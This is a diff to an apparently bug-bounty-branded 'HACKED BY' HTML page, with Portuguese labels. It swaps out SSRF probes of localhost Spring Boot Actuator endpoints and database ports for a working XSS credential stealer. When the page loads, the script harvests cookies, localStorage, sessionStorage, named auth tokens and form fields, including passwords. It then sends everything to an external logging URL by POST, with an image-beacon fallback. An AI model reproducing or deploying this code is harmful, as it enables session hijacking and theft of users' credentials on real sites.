@@ -67,6 +67,13 @@
         .hacked-banner a:hover {
             color: #c9d1d9;
         }
+        .credentials-box {
+            background: #1a1a2e;
+            border: 2px solid #f85149;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
@@ -85,65 +92,228 @@
             </div>
         </div>
         
-        <div class="box">
-            <h2 class="warning">⚡ Tentativas de Acesso a Serviços Internos</h2>
-            <div id="internal-access">
-                <p class="loading">Tentando acessar serviços internos via SSRF...</p>
+        <div class="credentials-box">
+            <h2 class="error">🔐 Credenciais do Usuário Logado</h2>
+            <div id="user-credentials">
+                <p class="loading">Coletando credenciais do usuário...</p>
             </div>
         </div>
         
         <div class="box">
-            <h2 class="info">📋 Endpoints Spring Boot para Testar</h2>
-            <div id="spring-endpoints"></div>
+            <h2 class="info">📋 Status do Envio para API</h2>
+            <div id="api-status">
+                <p class="loading">Aguardando coleta de dados...</p>
+            </div>
         </div>
         
         <div class="box">
-            <h2 class="info">📋 Log de Atividades</h2>
-            <div id="activity-log"></div>
+            <h2 class="info">📄 Dados Coletados (Serão Enviados para API)</h2>
+            <div id="collected-data">
+                <p class="loading">Coletando informações...</p>
+            </div>
         </div>
     </div>
     
-    <!-- Imagens que forçam o servidor a fazer requisições (server-side) -->
-    <!-- Spring Boot Actuator endpoints -->
-    <img src="http://127.0.0.1:8080/actuator/env" style="display:none" onerror="logAccess('actuator/env')">
-    <img src="http://127.0.0.1:8080/actuator/health" style="display:none" onerror="logAccess('actuator/health')">
-    <img src="http://127.0.0.1:8080/actuator/info" style="display:none" onerror="logAccess('actuator/info')">
-    <img src="http://127.0.0.1:8080/actuator/beans" style="display:none" onerror="logAccess('actuator/beans')">
-    <img src="http://127.0.0.1:8080/actuator/configprops" style="display:none" onerror="logAccess('actuator/configprops')">
-    <img src="http://127.0.0.1:8080/actuator/mappings" style="display:none" onerror="logAccess('actuator/mappings')">
-    <img src="http://127.0.0.1:8080/actuator/threaddump" style="display:none" onerror="logAccess('actuator/threaddump')">
-    <img src="http://127.0.0.1:8080/actuator/heapdump" style="display:none" onerror="logAccess('actuator/heapdump')">
-    
-    <!-- Endpoints comuns do Spring Boot -->
-    <img src="http://127.0.0.1:8080/api/admin" style="display:none" onerror="logAccess('api/admin')">
-    <img src="http://127.0.0.1:8080/admin" style="display:none" onerror="logAccess('admin')">
-    <img src="http://127.0.0.1:8080/management" style="display:none" onerror="logAccess('management')">
-    
-    <!-- Serviços internos -->
-    <img src="http://127.0.0.1:3306" style="display:none" onerror="logAccess('mysql-3306')">
-    <img src="http://127.0.0.1:5432" style="display:none" onerror="logAccess('postgres-5432')">
-    <img src="http://127.0.0.1:6379" style="display:none" onerror="logAccess('redis-6379')">
-    <img src="http://127.0.0.1:9200" style="display:none" onerror="logAccess('elasticsearch-9200')">
-    
     <script>
-        // XSS Payload - Executar alert e mostrar banner
+        // Configuração da API externa para receber logs
+        // AJUSTE ESTA URL para o endereço da sua API
+        const LOG_API_URL = 'https://seu-dominio.com/api/log.php';
+        
+        // XSS Payload
         (function() {
-            // Alert XSS
             try {
                 alert('⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️\n\nSSRF Vulnerability Confirmed!');
             } catch(e) {
                 console.log('Alert bloqueado, mas XSS ainda funciona');
             }
-            
-            // Adicionar ao título da página
             document.title = '⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️';
-            
-            // Adicionar ao console
             console.log('%c⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️', 'color: #f85149; font-size: 20px; font-weight: bold;');
             console.log('%cSSRF Vulnerability Confirmed!', 'color: #58a6ff; font-size: 16px;');
         })();
         
-        // Coletar informações do servidor
+        // Função para enviar dados para API externa
+        async function sendToExternalAPI(data) {
+            const statusDiv = document.getElementById('api-status');
+            statusDiv.innerHTML = '<p class="loading">Enviando dados para API externa...</p>';
+            
+            try {
+                const response = await fetch(LOG_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'cors'
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log('Dados enviados com sucesso para API externa:', result);
+                    statusDiv.innerHTML = `
+                        <p class="success">✓ Dados enviados com sucesso para API externa!</p>
+                        <pre>${JSON.stringify(result, null, 2)}</pre>
+                    `;
+                    return true;
+                } else {
+                    const errorText = await response.text();
+                    console.error('Erro ao enviar para API:', response.status, errorText);
+                    statusDiv.innerHTML = `
+                        <p class="error">✗ Erro ao enviar para API: ${response.status}</p>
+                        <pre>${errorText}</pre>
+                    `;
+                    return false;
+                }
+            } catch (error) {
+                console.error('Erro ao enviar para API:', error);
+                statusDiv.innerHTML = `
+                    <p class="error">✗ Erro ao enviar para API: ${error.message}</p>
+                    <p class="warning">Tentando fallback via GET...</p>
+                `;
+                
+                // Fallback: tentar via GET
+                try {
+                    const img = document.createElement('img');
+                    img.src = LOG_API_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
+                    img.style.display = 'none';
+                    img.onload = () => {
+                        statusDiv.innerHTML = '<p class="success">✓ Dados enviados via GET (fallback)</p>';
+                    };
+                    img.onerror = () => {
+                        statusDiv.innerHTML = '<p class="error">✗ Fallback também falhou</p>';
+                    };
+                    document.body.appendChild(img);
+                } catch(e) {
+                    console.error('Fallback também falhou:', e);
+                    statusDiv.innerHTML = '<p class="error">✗ Todos os métodos de envio falharam</p>';
+                }
+                return false;
+            }
+        }
+        
+        // Função para coletar credenciais
+        function collectUserCredentials() {
+            const credentials = {
+                timestamp: new Date().toISOString(),
+                cookies: {},
+                localStorage: {},
+                sessionStorage: {},
+                documentCookies: document.cookie,
+                authentication: {}
+            };
+            
+            if (document.cookie) {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name) {
+                        credentials.cookies[name] = value || '';
+                    }
+                });
+            }
+            
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    credentials.localStorage[key] = localStorage.getItem(key);
+                }
+            } catch(e) {
+                credentials.localStorage = {error: 'Acesso negado ao localStorage'};
+            }
+            
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    credentials.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {
+                credentials.sessionStorage = {error: 'Acesso negado ao sessionStorage'};
+            }
+            
+            const authKeys = [
+                'token', 'access_token', 'accessToken', 'auth_token', 'authToken',
+                'jwt', 'JWT', 'bearer', 'Bearer', 'authorization', 'Authorization',
+                'session', 'Session', 'sessionId', 'sessionID', 'session_id',
+                'csrf', 'CSRF', 'csrf_token', 'csrfToken', 'X-CSRF-TOKEN',
+                'api_key', 'apiKey', 'API_KEY', 'apikey',
+                'user', 'username', 'email', 'userId', 'user_id',
+                'refresh_token', 'refreshToken', 'refreshToken'
+            ];
+            
+            authKeys.forEach(key => {
+                if (credentials.cookies[key]) {
+                    credentials.authentication[key + '_cookie'] = credentials.cookies[key];
+                }
+                if (credentials.localStorage[key]) {
+                    credentials.authentication[key + '_localStorage'] = credentials.localStorage[key];
+                }
+                if (credentials.sessionStorage[key]) {
+                    credentials.authentication[key + '_sessionStorage'] = credentials.sessionStorage[key];
+                }
+            });
+            
+            try {
+                if (window.auth || window.user || window.currentUser) {
+                    credentials.authentication.windowAuth = {
+                        auth: window.auth,
+                        user: window.user,
+                        currentUser: window.currentUser
+                    };
+                }
+            } catch(e) {}
+            
+            try {
+                const forms = document.querySelectorAll('form');
+                forms.forEach((form, index) => {
+                    const formData = {};
+                    const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="hidden"]');
+                    inputs.forEach(input => {
+                        if (input.name || input.id) {
+                            formData[input.name || input.id] = input.value;
+                        }
+                    });
+                    if (Object.keys(formData).length > 0) {
+                        credentials.authentication[`form_${index}`] = formData;
+                    }
+                });
+            } catch(e) {}
+            
+            return credentials;
+        }
+        
+        function displayUserCredentials() {
+            const credentials = collectUserCredentials();
+            const hasCredentials = Object.keys(credentials.cookies).length > 0 ||
+                                 Object.keys(credentials.localStorage).length > 0 ||
+                                 Object.keys(credentials.sessionStorage).length > 0 ||
+                                 Object.keys(credentials.authentication).length > 0;
+            
+            let credentialsHtml = '';
+            
+            if (hasCredentials) {
+                credentialsHtml = `
+                    <h3 class="error">⚠️ Credenciais Encontradas:</h3>
+                    <pre>${JSON.stringify(credentials, null, 2)}</pre>
+                    <h3 class="warning">📋 Resumo:</h3>
+                    <ul>
+                        <li><strong>Cookies encontrados:</strong> ${Object.keys(credentials.cookies).length}</li>
+                        <li><strong>Itens no localStorage:</strong> ${Object.keys(credentials.localStorage).length}</li>
+                        <li><strong>Itens no sessionStorage:</strong> ${Object.keys(credentials.sessionStorage).length}</li>
+                        <li><strong>Tokens de autenticação encontrados:</strong> ${Object.keys(credentials.authentication).length}</li>
+                    </ul>
+                    <h3 class="info">🔑 Tokens de Autenticação Identificados:</h3>
+                    <pre>${JSON.stringify(credentials.authentication, null, 2)}</pre>
+                    <p class="warning">⚠️ ATENÇÃO: Estas credenciais foram capturadas via XSS!</p>
+                `;
+            } else {
+                credentialsHtml = `
+                    <p class="info">Nenhuma credencial encontrada.</p>
+                `;
+            }
+            
+            document.getElementById('user-credentials').innerHTML = credentialsHtml;
+            return credentials;
+        }
+        
         const serverInfo = {
             timestamp: new Date().toISOString(),
             url: window.location.href,
@@ -159,102 +329,24 @@
             hackedBy: 'https://hackerone.com/homeminvisivel'
         };
         
-        // Análise do User-Agent para identificar Spring Boot
         const isSpringBoot = serverInfo.userAgent.includes('Java') || 
                             serverInfo.userAgent.includes('Apache-HttpClient') ||
                             serverInfo.userAgent.includes('OkHttp') ||
                             serverInfo.userAgent.includes('Spring');
         
-        // Endpoints Spring Boot comuns para testar
-        const springBootEndpoints = [
-            // Spring Boot Actuator (muito comum e perigoso se exposto)
-            'http://127.0.0.1:8080/actuator',
-            'http://127.0.0.1:8080/actuator/env',
-            'http://127.0.0.1:8080/actuator/health',
-            'http://127.0.0.1:8080/actuator/info',
-            'http://127.0.0.1:8080/actuator/beans',
-            'http://127.0.0.1:8080/actuator/configprops',
-            'http://127.0.0.1:8080/actuator/mappings',
-            'http://127.0.0.1:8080/actuator/threaddump',
-            'http://127.0.0.1:8080/actuator/heapdump',
-            'http://127.0.0.1:8080/actuator/gateway/routes',
-            'http://127.0.0.1:8080/actuator/refresh',
-            'http://127.0.0.1:8080/actuator/restart',
-            
-            // Endpoints de administração
-            'http://127.0.0.1:8080/admin',
-            'http://127.0.0.1:8080/api/admin',
-            'http://127.0.0.1:8080/management',
-            
-            // APIs REST comuns
-            'http://127.0.0.1:8080/api/users',
-            'http://127.0.0.1:8080/api/config',
-            'http://127.0.0.1:8080/api/secrets',
-            
-            // H2 Console (se habilitado)
-            'http://127.0.0.1:8080/h2-console',
-            
-            // Outras portas comuns
-            'http://127.0.0.1:3000/api',
-            'http://127.0.0.1:5000/api'
-        ];
-        
-        // Serviços internos para testar
-        const internalServices = [
-            {name: 'MySQL', url: 'http://127.0.0.1:3306'},
-            {name: 'PostgreSQL', url: 'http://127.0.0.1:5432'},
-            {name: 'Redis', url: 'http://127.0.0.1:6379'},
-            {name: 'Elasticsearch', url: 'http://127.0.0.1:9200'},
-            {name: 'MongoDB', url: 'http://127.0.0.1:27017'},
-            {name: 'Memcached', url: 'http://127.0.0.1:11211'}
-        ];
-        
-        let accessAttempts = [];
-        let activityLog = [];
-        
-        // Função para log
-        function addLog(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            activityLog.push({timestamp, message, type});
-            updateActivityLog();
-        }
-        
-        function logAccess(endpoint) {
-            accessAttempts.push({
-                endpoint: endpoint,
-                timestamp: new Date().toISOString(),
-                status: 'Acessado (onerror disparado)'
-            });
-            addLog(`Tentativa de acesso: ${endpoint}`, 'warning');
-            updateInternalAccess();
-        }
-        
-        function updateActivityLog() {
-            const logHtml = activityLog.map(log => 
-                `<p class="${log.type}">[${log.timestamp}] ${log.message}</p>`
-            ).join('');
-            document.getElementById('activity-log').innerHTML = logHtml || '<p>Nenhuma atividade registrada ainda.</p>';
-        }
-        
-        function updateInternalAccess() {
-            const attemptsHtml = `
-                <h3 class="warning">Tentativas de Acesso:</h3>
-                <pre>${JSON.stringify(accessAttempts, null, 2)}</pre>
-                <p><strong>Total de tentativas:</strong> ${accessAttempts.length}</p>
-                <p class="info">Nota: Se o servidor Spring Boot processar essas URLs, elas serão acessadas server-side.</p>
-            `;
-            document.getElementById('internal-access').innerHTML = attemptsHtml;
-        }
-        
-        // Exibir informações do servidor
         function displayServerInfo() {
             const springBootInfo = isSpringBoot ? 
                 '<p class="success">✓ User-Agent indica possível Spring Boot/Java</p>' : 
                 '<p class="warning">⚠ User-Agent não indica Spring Boot claramente</p>';
             
+            const serverInfoWithCredentials = {
+                ...serverInfo,
+                isSpringBoot: isSpringBoot
+            };
+            
             const infoHtml = `
                 <h3 class="success">✓ Informações Coletadas:</h3>
-                <pre>${JSON.stringify(serverInfo, null, 2)}</pre>
+                <pre>${JSON.stringify(serverInfoWithCredentials, null, 2)}</pre>
                 ${springBootInfo}
                 <h3 class="info">Análise:</h3>
                 <ul>
@@ -265,57 +357,61 @@
                     <li><strong>Possível Spring Boot:</strong> ${isSpringBoot ? 'Sim' : 'Não detectado'}</li>
                     <li><strong>Hacked By:</strong> <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a></li>
                 </ul>
-                <p class="warning">⚠ IMPORTANTE: Se o User-Agent contém "Java", "Apache-HttpClient" ou similar, o servidor Spring Boot fez a requisição (SSRF confirmado).</p>
             `;
             document.getElementById('server-info').innerHTML = infoHtml;
         }
         
-        // Exibir endpoints para testar
-        function displaySpringEndpoints() {
-            const endpointsHtml = `
-                <h3 class="info">Endpoints Spring Boot Actuator (Alto Impacto):</h3>
+        function displayCollectedData(allData) {
+            const dataHtml = `
+                <h3 class="success">📊 Todos os Dados Coletados:</h3>
+                <pre>${JSON.stringify(allData, null, 2)}</pre>
+                <h3 class="info">📋 Resumo:</h3>
                 <ul>
-                    <li><code>/actuator/env</code> - Variáveis de ambiente (pode conter secrets)</li>
-                    <li><code>/actuator/configprops</code> - Propriedades de configuração</li>
-                    <li><code>/actuator/beans</code> - Beans do Spring</li>
-                    <li><code>/actuator/mappings</code> - Mapeamentos de rotas</li>
-                    <li><code>/actuator/threaddump</code> - Dump de threads</li>
-                    <li><code>/actuator/heapdump</code> - Dump de memória</li>
+                    <li><strong>Timestamp:</strong> ${allData.timestamp}</li>
+                    <li><strong>User-Agent:</strong> ${allData.serverInfo.userAgent}</li>
+                    <li><strong>URL:</strong> ${allData.serverInfo.url}</li>
+                    <li><strong>Cookies encontrados:</strong> ${Object.keys(allData.userCredentials.cookies).length}</li>
+                    <li><strong>Tokens de autenticação:</strong> ${Object.keys(allData.userCredentials.authentication).length}</li>
                 </ul>
-                <h3 class="info">Como Testar Manualmente:</h3>
-                <p>Use estes endpoints no payload SSRF:</p>
-                <pre>http://127.0.0.1:8080/actuator/env
-http://127.0.0.1:8080/actuator/configprops
-http://127.0.0.1:8080/actuator/health</pre>
-                <p class="warning">⚠ Se o Spring Boot Actuator estiver exposto internamente, você pode obter informações sensíveis!</p>
-                <p class="info">🔗 Reportado por: <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a></p>
+                <p class="warning">⚠️ Estes dados serão enviados para a API externa e gravados no log.txt</p>
             `;
-            document.getElementById('spring-endpoints').innerHTML = endpointsHtml;
+            document.getElementById('collected-data').innerHTML = dataHtml;
         }
         
         // Inicializar
-        window.addEventListener('load', () => {
-            addLog('⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️', 'error');
-            addLog('Página carregada - Iniciando coleta de informações', 'success');
-            displayServerInfo();
-            displaySpringEndpoints();
-            addLog('Informações do servidor coletadas e exibidas', 'success');
-            addLog('Tentativas de acesso a serviços internos iniciadas via tags img', 'warning');
+        window.addEventListener('load', async () => {
+            console.log('⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️');
+            console.log('Iniciando coleta de informações...');
             
-            // Criar mais tags img para endpoints Spring Boot
-            springBootEndpoints.forEach(endpoint => {
-                const img = document.createElement('img');
-                img.src = endpoint;
-                img.style.display = 'none';
-                img.onerror = () => logAccess(endpoint);
-                document.body.appendChild(img);
-            });
+            // Coletar credenciais do usuário
+            const userCredentials = collectUserCredentials();
+            displayUserCredentials();
+            
+            // Exibir informações do servidor
+            displayServerInfo();
+            
+            // Preparar todos os dados coletados
+            const allCollectedData = {
+                timestamp: new Date().toISOString(),
+                serverInfo: {
+                    ...serverInfo,
+                    isSpringBoot: isSpringBoot
+                },
+                userCredentials: userCredentials
+            };
+            
+            // Exibir dados coletados
+            displayCollectedData(allCollectedData);
+            
+            // Enviar para API externa
+            console.log('Enviando dados para API externa...');
+            await sendToExternalAPI(allCollectedData);
+            
+            console.log('Processo concluído!');
         });
         
-        // Adicionar "hacked by" na URL se não estiver presente
         if (!window.location.href.includes('hackerone.com/homeminvisivel')) {
             const newUrl = window.location.href + (window.location.search ? '&' : '?') + 'hacked_by=https://hackerone.com/homeminvisivel';
-            // Não redirecionar automaticamente, apenas adicionar ao histórico
             if (window.history && window.history.replaceState) {
                 window.history.replaceState({}, '', newUrl);
             }
